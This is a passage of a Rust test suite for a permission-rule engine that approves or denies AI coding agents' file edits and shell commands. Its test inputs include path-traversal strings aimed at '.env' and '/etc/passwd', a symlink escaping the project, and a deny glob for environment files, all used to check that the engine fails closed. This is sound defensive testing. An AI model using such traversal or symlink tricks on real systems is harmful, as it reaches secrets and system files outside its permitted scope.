                    output_preview: None,
                },
                false,
            )
            .unwrap_or_else(|| panic!("expected CommandPrefix for `{cmd}`"));
            assert_eq!(
                derived.pattern_kind,
                PermissionRulePatternKind::CommandPrefix
            );
            assert_eq!(derived.pattern, expected_prefix);
        }
    }

    #[test]
    fn multi_file_diff_checks_every_path_and_blocks_placeholder_and_truncated_diffs() {
        let allow_src = make_rule(
            "allow_src",
            PermissionRuleScopeKind::Project,
            Some("/repo"),
            None,
            PermissionRuleToolKind::FileWrite,
            PermissionRulePatternKind::PathGlob,
            "src/**",
            PermissionRuleDecision::Allow,
        );
        let deny_env = make_rule(
            "deny_env",
            PermissionRuleScopeKind::Project,
            Some("/repo"),
            None,
            PermissionRuleToolKind::FileWrite,
            PermissionRulePatternKind::PathGlob,
            "**/.env*",
            PermissionRuleDecision::Deny,
        );

        // Multi-file Codex FileEdit where first path is `src/main.rs` but diff ALSO touches `.env`!
        let multi_diff = ToolCallDetail::FileEdit {
            path: "src/main.rs".into(),
            unified_diff: Some(
                "--- a/src/main.rs\n+++ b/src/main.rs\n@@ -1 +1 @@\n-old\n+new\n--- a/.env\n+++ b/.env\n@@ -1 +1 @@\n-A=1\n+A=2\n"
                    .into(),
            ),
        };
        let res = evaluate_permission_rules(
            &[allow_src.clone(), deny_env.clone()],
            &PermissionRuleEvalContext {
                project_cwd: "/repo",
                provider: ProviderKind::Codex,
                title: "Approve file modifications",
                detail: &multi_diff,
                has_plan_approval: false,
            },
        )
        .expect("multi-file diff touching .env MUST trigger deny_env");
        assert_eq!(res.rule.id, "deny_env");

        // Even without deny_env, `allow_src` MUST NOT allow multi-file diff touching README.md outside `src/**`!
        let multi_outside_src = ToolCallDetail::FileEdit {
            path: "src/main.rs".into(),
            unified_diff: Some(
                "--- a/src/main.rs\n+++ b/src/main.rs\n@@ -1 +1 @@\n-a\n+b\n--- a/README.md\n+++ b/README.md\n@@ -1 +1 @@\n-x\n+y\n"
                    .into(),
            ),
        };
        assert!(
            evaluate_permission_rules(
                std::slice::from_ref(&allow_src),
                &PermissionRuleEvalContext {
                    project_cwd: "/repo",
                    provider: ProviderKind::Codex,
                    title: "Edit",
                    detail: &multi_outside_src,
                    has_plan_approval: false,
                },
            )
            .is_none()
        );
        // Multi-file diff MUST NOT derive a misleading single-file AlwaysAllow rule
        assert!(
            derive_rule_from_always_allow(
                "/repo",
                ProviderKind::Codex,
                "Edit",
                &multi_outside_src,
                false,
            )
            .is_none()
        );

        // Placeholder path `"workspace files"` with no diff MUST NOT auto-allow or derive a rule!
        let placeholder = ToolCallDetail::FileEdit {
            path: "workspace files".into(),
            unified_diff: None,
        };
        let allow_file_edit_tool = make_rule(
            "allow_fe",
            PermissionRuleScopeKind::Project,
            Some("/repo"),
            None,
            PermissionRuleToolKind::FileWrite,
            PermissionRulePatternKind::ToolName,
            "file_edit",
            PermissionRuleDecision::Allow,
        );
        assert!(
            evaluate_permission_rules(
                &[allow_src, allow_file_edit_tool],
                &PermissionRuleEvalContext {
                    project_cwd: "/repo",
                    provider: ProviderKind::Codex,
                    title: "Approve file modifications",
                    detail: &placeholder,
                    has_plan_approval: false,
                },
            )
            .is_none()
        );
        assert!(
            derive_rule_from_always_allow(
                "/repo",
                ProviderKind::Codex,
                "Approve file modifications",
                &placeholder,
                false,
            )
            .is_none()
        );
    }

    #[test]
    fn title_only_and_pi_confirm_dialogs_never_auto_allow_or_derive_rules() {
        let pi_confirm = ToolCallDetail::Generic {
            tool_name: "Confirm Pi action".into(),
            arguments_json: "Delete staging database?".into(),
        };
        assert!(
            derive_rule_from_always_allow(
                "/repo",
                ProviderKind::Pi,
                "Confirm Pi action",
                &pi_confirm,
                false,
            )
            .is_none()
        );

        let agy_title_only = ToolCallDetail::Generic {
            tool_name: "shell_confirm".into(),
            arguments_json: serde_json::json!({
                "title": "Run command",
                ORBIT_TITLE_ONLY_MARKER_KEY: true
            })
            .to_string(),
        };
        let allow_shell_confirm = make_rule(
            "allow_sc",
            PermissionRuleScopeKind::Project,
            Some("/repo"),
            None,
            PermissionRuleToolKind::Any,
            PermissionRulePatternKind::ToolName,
            "shell_confirm",
            PermissionRuleDecision::Allow,
        );
        assert!(
            evaluate_permission_rules(
                &[allow_shell_confirm],
                &PermissionRuleEvalContext {
                    project_cwd: "/repo",
                    provider: ProviderKind::Antigravity,
                    title: "Run command",
                    detail: &agy_title_only,
                    has_plan_approval: false,
                },
            )
            .is_none()
        );
        assert!(
            derive_rule_from_always_allow(
                "/repo",
                ProviderKind::Antigravity,
                "Run command",
                &agy_title_only,
                false,
            )
            .is_none()
        );
    }

    #[cfg(unix)]
    #[test]
    fn dangling_and_cyclic_symlinks_resolve_or_fail_closed() {
        use std::os::unix::fs::symlink;

        let tmp = std::env::temp_dir().join(format!(
            "orbit-dangling-symlink-test-{}",
            Uuid::new_v4().simple()
        ));
        let repo = tmp.join("repo");
        let outside = tmp.join("outside");
        std::fs::create_dir_all(repo.join("src")).expect("create repo/src");
        std::fs::create_dir_all(&outside).expect("create outside");

        // Dangling symlink inside `src/` pointing to a non-existent file OUTSIDE repo!
        let dangling_link = repo.join("src/escape_link");
        let dangling_target = outside.join("future_secret.txt");
        symlink(&dangling_target, &dangling_link).expect("create dangling symlink");

        // Cyclic symlink inside `src/`
        let cyc_a = repo.join("src/cyc_a");
        let cyc_b = repo.join("src/cyc_b");
        symlink(&cyc_b, &cyc_a).expect("create cyc_a");
        symlink(&cyc_a, &cyc_b).expect("create cyc_b");

        let repo_str = repo.to_string_lossy().to_string();
        let outside_canon = canonicalize_project_cwd(&outside.to_string_lossy());
        let allow_src = make_rule(
            "allow_src",
            PermissionRuleScopeKind::Project,
            Some(&repo_str),
            None,
            PermissionRuleToolKind::FileWrite,
            PermissionRulePatternKind::PathGlob,
            "src/**",
            PermissionRuleDecision::Allow,
        );
        let deny_outside = make_rule(
            "deny_outside",
            PermissionRuleScopeKind::Host,
            None,
            None,
            PermissionRuleToolKind::FileWrite,
            PermissionRulePatternKind::PathGlob,
            &format!("{outside_canon}/**"),
            PermissionRuleDecision::Deny,
        );

        let dangling_edit = ToolCallDetail::FileEdit {
            path: "src/escape_link".into(),
            unified_diff: None,
        };
        // MUST NOT match project-relative `allow_src`!
        assert!(
            evaluate_permission_rules(
                std::slice::from_ref(&allow_src),
                &PermissionRuleEvalContext {
                    project_cwd: &repo_str,
                    provider: ProviderKind::Codex,
                    title: "Edit",
                    detail: &dangling_edit,
                    has_plan_approval: false,
                },
            )
            .is_none(),
            "dangling symlink escaping project MUST NOT match allow_src"
        );
        // MUST trigger `deny_outside`!
        let m_deny = evaluate_permission_rules(
            &[allow_src.clone(), deny_outside],
            &PermissionRuleEvalContext {
                project_cwd: &repo_str,
                provider: ProviderKind::Codex,
                title: "Edit",
                detail: &dangling_edit,
                has_plan_approval: false,
            },
        )
        .expect("dangling symlink targeting outside dir MUST trigger deny_outside");
        assert_eq!(m_deny.rule.id, "deny_outside");

        // Cyclic symlink MUST fail-closed on Allow AND still match raw Deny glob!
        let cyclic_edit = ToolCallDetail::FileEdit {
            path: "src/cyc_a".into(),
            unified_diff: None,
        };
        assert!(
            evaluate_permission_rules(
                std::slice::from_ref(&allow_src),
                &PermissionRuleEvalContext {
                    project_cwd: &repo_str,
                    provider: ProviderKind::Codex,
                    title: "Edit",
                    detail: &cyclic_edit,
                    has_plan_approval: false,
                },
            )
            .is_none(),
            "cyclic symlink MUST fail-closed for Allow"
        );
        assert!(
            derive_rule_from_always_allow(
                &repo_str,
                ProviderKind::Codex,
                "Edit",
                &cyclic_edit,
                false,
            )
            .is_none()
        );
        let deny_cyc = make_rule(
            "deny_cyc",
            PermissionRuleScopeKind::Project,
            Some(&repo_str),
            None,
            PermissionRuleToolKind::FileWrite,
            PermissionRulePatternKind::PathGlob,
            "src/cyc_*",
            PermissionRuleDecision::Deny,
        );
        let m_cyc = evaluate_permission_rules(
            &[allow_src, deny_cyc],
            &PermissionRuleEvalContext {
                project_cwd: &repo_str,
                provider: ProviderKind::Codex,
                title: "Edit",
                detail: &cyclic_edit,
                has_plan_approval: false,
            },
        )
        .expect("cyclic symlink must still match raw Deny glob");
        assert_eq!(m_cyc.rule.id, "deny_cyc");

        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn derived_file_rules_escape_glob_metacharacters_and_preserve_filename_spaces() {
        // Filename containing `*` and `[1]` MUST be escaped so sibling files do NOT match!
        let special_file = ToolCallDetail::FileEdit {
            path: "src/report_*_[1].txt".into(),
            unified_diff: None,
        };
        let derived = derive_rule_from_always_allow(
            "/repo",
            ProviderKind::ClaudeCode,
            "Edit",
            &special_file,
            false,
        )
        .expect("should derive escaped rule");
        assert_eq!(derived.pattern, r"src/report_\*_\[1\].txt");

        let rule = make_rule(
            "r_special",
            PermissionRuleScopeKind::Project,
            Some("/repo"),
            None,
            PermissionRuleToolKind::FileWrite,
            PermissionRulePatternKind::PathGlob,
            &derived.pattern,
            PermissionRuleDecision::Allow,
        );
        // Exact file matches
        assert!(
            evaluate_permission_rules(
                std::slice::from_ref(&rule),
                &PermissionRuleEvalContext {
                    project_cwd: "/repo",
                    provider: ProviderKind::ClaudeCode,
                    title: "Edit",
                    detail: &special_file,
                    has_plan_approval: false,
                },
            )
            .is_some()
        );
        // Different sibling matching unescaped glob MUST NOT match!
        let sibling = ToolCallDetail::FileEdit {
            path: "src/report_secret_1.txt".into(),
            unified_diff: None,
        };
        assert!(
            evaluate_permission_rules(
                &[rule],
                &PermissionRuleEvalContext {
                    project_cwd: "/repo",
                    provider: ProviderKind::ClaudeCode,
                    title: "Edit",
                    detail: &sibling,
                    has_plan_approval: false,
                },
            )
            .is_none()
        );

        // Leading/trailing spaces in valid Unix filename MUST be preserved!
        let spaced = ToolCallDetail::FileEdit {
            path: "src/ note.txt ".into(),
            unified_diff: None,
        };
        let derived_spaced = derive_rule_from_always_allow(
            "/repo",
            ProviderKind::ClaudeCode,
            "Edit",
            &spaced,
            false,
        )
        .expect("should preserve spaces");
        assert_eq!(derived_spaced.pattern, "src/ note.txt ");
    }

    #[test]
    fn precedence_deny_beats_allow_and_project_beats_host_and_specific_provider_beats_any() {
        let host_deny = make_rule(
            "host_deny",
            PermissionRuleScopeKind::Host,
            None,
            None,
            PermissionRuleToolKind::Shell,
            PermissionRulePatternKind::CommandPrefix,
            "cargo publish",
            PermissionRuleDecision::Deny,
        );
        let project_allow = make_rule(
            "proj_allow",
            PermissionRuleScopeKind::Project,
            Some("/repo"),
            Some(ProviderKind::Codex),
            PermissionRuleToolKind::Shell,
            PermissionRulePatternKind::ExactCommand,
            "cargo publish --dry-run",
            PermissionRuleDecision::Allow,
        );
        let detail = ToolCallDetail::Shell {
            command: "cargo publish --dry-run".into(),
            cwd: None,
            exit_code: None,
            output_preview: None,
        };
        let m = evaluate_permission_rules(
            &[project_allow, host_deny],
            &PermissionRuleEvalContext {
                project_cwd: "/repo",
                provider: ProviderKind::Codex,
                title: "Publish",
                detail: &detail,
                has_plan_approval: false,
            },
        )
        .expect("should match");
        assert_eq!(m.rule.id, "host_deny");
        assert_eq!(m.rule.decision, PermissionRuleDecision::Deny);

        let host_allow = make_rule(
            "host_allow",
            PermissionRuleScopeKind::Host,
            None,
            Some(ProviderKind::Codex),
            PermissionRuleToolKind::Shell,
            PermissionRulePatternKind::CommandPrefix,
            "cargo test",
            PermissionRuleDecision::Allow,
        );
        let project_any_allow = make_rule(
            "proj_any_allow",
            PermissionRuleScopeKind::Project,
            Some("/repo"),
            None,
            PermissionRuleToolKind::Shell,
            PermissionRulePatternKind::CommandPrefix,
            "cargo test",
            PermissionRuleDecision::Allow,
        );
        let project_codex_allow = make_rule(
            "proj_codex_allow",
            PermissionRuleScopeKind::Project,
            Some("/repo"),
            Some(ProviderKind::Codex),
            PermissionRuleToolKind::Shell,
            PermissionRulePatternKind::CommandPrefix,
            "cargo test",
            PermissionRuleDecision::Allow,
        );
        let test_detail = ToolCallDetail::Shell {
            command: "cargo test".into(),
            cwd: None,
            exit_code: None,
            output_preview: None,
        };

        let m_proj = evaluate_permission_rules(
            &[host_allow.clone(), project_any_allow.clone()],
            &PermissionRuleEvalContext {
                project_cwd: "/repo",
                provider: ProviderKind::Codex,
                title: "Test",
                detail: &test_detail,
                has_plan_approval: false,
            },
        )
        .expect("should match");
        assert_eq!(m_proj.rule.id, "proj_any_allow");

        let m_spec = evaluate_permission_rules(
            &[host_allow, project_any_allow, project_codex_allow],
            &PermissionRuleEvalContext {
                project_cwd: "/repo",
                provider: ProviderKind::Codex,
                title: "Test",
                detail: &test_detail,
                has_plan_approval: false,
            },
        )
        .expect("should match");
        assert_eq!(m_spec.rule.id, "proj_codex_allow");
    }

    #[test]
    fn plan_approval_gates_are_strictly_immune_to_all_rules() {
        let allow_exit_plan = make_rule(
            "allow_exit_plan",
            PermissionRuleScopeKind::Host,
            None,
            None,
            PermissionRuleToolKind::Any,
            PermissionRulePatternKind::ToolName,
            "ExitPlanMode",
            PermissionRuleDecision::Allow,
        );
        let detail = ToolCallDetail::Generic {
            tool_name: "ExitPlanMode".into(),
            arguments_json: "{}".into(),
        };
        let res = evaluate_permission_rules(
            &[allow_exit_plan],
            &PermissionRuleEvalContext {
                project_cwd: "/repo",
                provider: ProviderKind::ClaudeCode,
                title: "Review plan",
                detail: &detail,
                has_plan_approval: true,
            },
        );
        assert!(res.is_none(), "plan approval gates must NEVER match rules");
        assert!(
            derive_rule_from_always_allow("/repo", ProviderKind::ClaudeCode, "Plan", &detail, true)
                .is_none()
        );
    }

    #[test]
    fn path_glob_canonicalization_blocks_dotdot_escape_and_catches_deny() {
        let allow_src = make_rule(
            "allow_src",
            PermissionRuleScopeKind::Project,
            Some("/repo"),
            None,
            PermissionRuleToolKind::FileWrite,
            PermissionRulePatternKind::PathGlob,
            "src/**",
            PermissionRuleDecision::Allow,
        );
        let deny_env = make_rule(
            "deny_env",
            PermissionRuleScopeKind::Project,
            Some("/repo"),
            None,
            PermissionRuleToolKind::FileWrite,
            PermissionRulePatternKind::PathGlob,
            "**/.env*",
            PermissionRuleDecision::Deny,
        );

        let ok = ToolCallDetail::FileEdit {
            path: "src/app/main.rs".into(),
            unified_diff: None,
        };
        let m_ok = evaluate_permission_rules(
            &[allow_src.clone(), deny_env.clone()],
            &PermissionRuleEvalContext {
                project_cwd: "/repo",
                provider: ProviderKind::Codex,
                title: "Edit",
                detail: &ok,
                has_plan_approval: false,
            },
        )
        .expect("src/app/main.rs should match allow_src");
        assert_eq!(m_ok.rule.id, "allow_src");

        let env_escape = ToolCallDetail::FileEdit {
            path: "src/../.env".into(),
            unified_diff: None,
        };
        let m_env = evaluate_permission_rules(
            &[allow_src.clone(), deny_env],
            &PermissionRuleEvalContext {
                project_cwd: "/repo",
                provider: ProviderKind::Codex,
                title: "Edit",
                detail: &env_escape,
                has_plan_approval: false,
            },
        )
        .expect("src/../.env must trigger deny_env");
        assert_eq!(m_env.rule.id, "deny_env");

        let outside = ToolCallDetail::FileEdit {
            path: "src/../../etc/passwd".into(),
            unified_diff: None,
        };
        let m_out = evaluate_permission_rules(
            &[allow_src],
            &PermissionRuleEvalContext {
                project_cwd: "/repo",
                provider: ProviderKind::Codex,
                title: "Edit",
                detail: &outside,
                has_plan_approval: false,
            },
        );
        assert!(m_out.is_none());
    }
}
